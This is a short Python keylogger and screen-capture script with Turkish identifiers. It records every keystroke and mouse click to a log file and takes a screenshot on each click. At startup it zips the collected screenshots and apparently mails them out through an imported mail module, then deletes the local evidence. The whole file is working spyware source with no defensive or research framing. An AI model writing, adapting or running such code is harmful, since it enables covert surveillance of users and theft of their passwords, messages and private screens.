import os
from pynput.keyboard import Key, Listener
from pynput.mouse import Listener
import pyautogui
import mail
import file_to_zip as zipper
import shutil

if os.path.exists("picture") and os.path.exists("log.txt")  :
    zipper.klasoru_zip_yap("./picture", "picture.zip")
    mail.gönder()
    os.remove("log.txt")
    os.remove("picture.zip")
    shutil.rmtree("picture")


check = os.path.exists("./log.txt")

if check == False:
    open("log.txt","x", encoding="utf-8")


def yaz(yazi):
        
    file = open("log.txt", "a")

    file.write(yazi)

    file = open("log.txt", "r")

    file.read()



def on_click(x, y, button, pressed):
    if pressed:
        yazi = "\nfare kordinatları => x = {} , y = {} \t Tuş => {} ".format(x,y,button)
        
        yaz(yazi)
        
        if not(os.path.exists("picture")):
            os.mkdir("picture")
            
        icindekiler = os.listdir('./picture/')
        sayi = len(icindekiler)
        isim = "{}.jpg".format(sayi+1)

        if os.path.isfile(isim):
            print("var")
        else:
            ekran_goruntusu = pyautogui.screenshot()
            dosya_adi = isim
            dosya_yolu = os.path.join('./picture/', dosya_adi)
            ekran_goruntusu.save(dosya_yolu)
            

def on_press(key):

    yazi = "{} , ".format(key)

    yaz(yazi)


from pynput import keyboard, mouse

key_listener = keyboard.Listener(on_press=on_press)
key_listener.start()

mouse_listener = mouse.Listener(on_click=on_click)
mouse_listener.start()

input()

